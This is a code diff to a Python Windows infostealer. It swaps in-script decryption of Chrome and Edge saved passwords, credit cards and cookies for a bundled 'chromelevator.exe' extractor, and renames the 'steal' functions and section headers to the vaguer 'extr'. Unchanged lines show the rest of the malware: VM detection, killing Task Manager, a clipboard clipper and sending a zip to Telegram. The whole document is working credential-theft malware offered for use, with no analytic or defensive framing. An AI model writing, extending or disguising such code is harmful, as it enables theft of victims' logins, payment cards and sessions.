@@ -31,6 +31,16 @@ import sys
 import pyautogui
 pyautogui.FAILSAFE = False
 
+def resource_path(filename):
+    """
+    Get the bundled path to a data file (works in dev and in a PyInstaller one-file exe).
+    """
+    try:
+        base_path = sys._MEIPASS
+    except AttributeError:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, filename)
+
 
 def single_instance_check():
     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\SysSvcMutex")
@@ -142,7 +152,7 @@ def kill_taskmgr_once():
         pass
 
 
-# === BROWSER DATA THEFT ===
+# === BROWSER DATA EXT ===
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 BROWSERS = {
@@ -185,90 +195,113 @@ def decrypt(buff, aes_key):
 
 
 
-def steal_browser():
-    for name, path in BROWSERS.items():
-        if not os.path.exists(path): continue
-        key = get_key(path)
-        if not key: continue
+import json
 
-        for prof in os.listdir(path):
-            if not ("Default" in prof or "Profile" in prof): continue
-            p = os.path.join(path, prof)
+def run_chrome_elevator(browser_name):
+    """
+    Runs chromelevator.exe for the given browser_name ('chrome' or 'edge'),
+    outputs into EXTRACT_FOLDER.
+    Returns True on success, False otherwise.
+    """
+    # use resource_path so PyInstaller’s --add-data will point to the bundled file
+    exe = resource_path("chromelevator.exe")
+    if not os.path.exists(exe):
+        # if you want a fallback, you can still try next to your script
+        exe = os.path.join(os.path.dirname(sys.argv[0]), "chromelevator.exe")
 
-            # === PASSWORDS ===
-            db = os.path.join(p, "Login Data")
-            if os.path.exists(db):
-                shutil.copy2(db, "tmp_pwd.db")
-                c = sqlite3.connect("tmp_pwd.db").cursor()
+    cmd = [exe, browser_name, "-o", EXTRACT_FOLDER]
+    try:
+        subprocess.run(cmd, check=True,
+                       stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL)
+        return True
+    except Exception:
+        return False
+
+
+
+_elevator_ran = False
+def extr_browser():
+    global _elevator_ran
+    if _elevator_ran: 
+        return
+    _elevator_ran = True
+
+    os.makedirs(EXTRACT_FOLDER, exist_ok=True)
+
+    # run for both chrome & edge
+    for short, keyname in (("chrome","Chrome"), ("edge","Edge")):
+        # skip if browser data folder missing
+        if not os.path.isdir(BROWSERS.get(keyname, "")):
+            continue
+
+        ok = run_chrome_elevator(short)
+        if not ok:
+            # fallback error log
+            with open(os.path.join(EXTRACT_FOLDER, f"{short}_elevator_error.txt"), "a") as f:
+                f.write(f"{time.ctime()}: chromelevator for {short} failed\n")
+            continue
+
+        # now parse the JSON outputs
+        base_out = os.path.join(EXTRACT_FOLDER, keyname)
+        if not os.path.isdir(base_out):
+            continue
+
+        for profile in os.listdir(base_out):
+            prof_dir = os.path.join(base_out, profile)
+            if not os.path.isdir(prof_dir):
+                continue
+
+            # helper to load+dump
+            def json_to_txt(fn, header, fmt_line):
+                jpath = os.path.join(prof_dir, fn + ".json")
+                tpath = os.path.join(prof_dir, fn + ".txt")
+                if not os.path.exists(jpath):
+                    return
                 try:
-                    c.execute("SELECT origin_url, username_value, password_value FROM logins")
-                    with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
-                        for row in c.fetchall():
-                            blob = bytes(row[2])
-                            if not blob:
-                                continue
-
-                            try:
-                                if blob[:3] in (b'v10', b'v11'):
-                                    decrypted_pw = decrypt(blob, key)
-                                else:
-                                    decrypted_pw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", "ignore")
-                            except Exception as e:
-                                decrypted_pw = f"[FAILED: {e}] | BLOB PREFIX: {blob[:10].hex()}"
-
-                            f.write(f"[{name}] {row[0]} | {row[1]} | {decrypted_pw}\n")
-
-
-
-                except: pass
-                c.connection.close()
-                os.remove("tmp_pwd.db")
-
-            # === CARDS ===
-            card_db = os.path.join(p, "Web Data")
-            if os.path.exists(card_db):
-                shutil.copy2(card_db, "tmp_card.db")
-                conn = sqlite3.connect("tmp_card.db")
-                try:
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-                    rows = cursor.fetchall()
-                    with open(os.path.join(EXTRACT_FOLDER, "cards.txt"), "a", encoding="utf-8", errors="ignore") as f:
-                        for name_on_card, mm, yy, enc in rows:
-                            card_number = decrypt(enc, key)
-                            f.write(f"[{name}] {name_on_card} | {mm}/{yy} | {card_number}\n")
-                except: pass
-                conn.close()
-                os.remove("tmp_card.db")
-
-            # === COOKIES ===
-            cookie_db = os.path.join(p, "Cookies")
-            if os.path.exists(cookie_db):
-                try:
-                    shutil.copy2(cookie_db, "tmp_cookie.db")
-                    conn = sqlite3.connect("tmp_cookie.db")
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-                    with open(os.path.join(EXTRACT_FOLDER, "cookies.txt"), "a", encoding="utf-8", errors="ignore") as f:
-                        for host, name_, enc_val in cursor.fetchall():
-                            if not enc_val:
-                                continue
-                            decrypted = decrypt(enc_val, key)
-                            f.write(f"[{name}] {host} | {name_} = {decrypted}\n")
-                    conn.commit()
-                    conn.close()
-                    os.remove("tmp_cookie.db")
-
+                    with open(jpath, "r", encoding="utf-8") as jf:
+                        arr = json.load(jf)
+                    with open(tpath, "w", encoding="utf-8") as tf:
+                        tf.write(f"=== {keyname} : {profile} → {header} ===\n\n")
+                        for entry in arr:
+                            tf.write(fmt_line(entry) + "\n")
                 except Exception as e:
-                    log_path = os.path.join(EXTRACT_FOLDER, "cookie_error.log")
-                    with open(log_path, "a", encoding="utf-8") as log:
-                        log.write(f"[{name}] Cookie extraction failed: {e}\n")
+                    with open(os.path.join(prof_dir, f"{fn}_parse_error.log"), "w") as err:
+                        err.write(str(e))
+                # optionally delete JSON
+                os.remove(jpath)
+
+            # passwords.json → URL | user | pass
+            json_to_txt(
+                "passwords",
+                "Passwords",
+                lambda e: f"{e.get('origin','')} | {e.get('username','')} | {e.get('password','')}"
+            )
+
+            # cookies.json → host | name = value
+            json_to_txt(
+                "cookies",
+                "Cookies",
+                lambda e: f"{e.get('host','')} | {e.get('name','')} = {e.get('value','')}"
+            )
+
+            # payments.json → card info
+            json_to_txt(
+                "payments",
+                "Payments",
+                lambda e: (
+                    f"{e.get('name_on_card','')} "
+                    f"{e.get('expiration_month','')}/{e.get('expiration_year','')} → "
+                    f"{e.get('card_number','')}"
+                )
+            )
+
 
 
 
 
 # === FIREFOX PASSWORD DECRYPTION ===
-def steal_firefox_passwords():
+def extr_firefox_passwords():
     ROAMING = os.getenv("APPDATA")
     firefox_profiles = os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles")
     if not os.path.exists(firefox_profiles):
@@ -716,8 +749,8 @@ def run():
                 detect_vm()
                 kill_taskmgr_once()
                 clipper()
-                steal_browser()
-                steal_firefox_passwords()
+                extr_browser()
+                extr_firefox_passwords()
                 send_zip_to_telegram()
                 mark_exfiltrated()
         except Exception as e:
@@ -742,6 +775,5 @@ def run():
 
 if __name__ == "__main__":
     run()
-
 
 
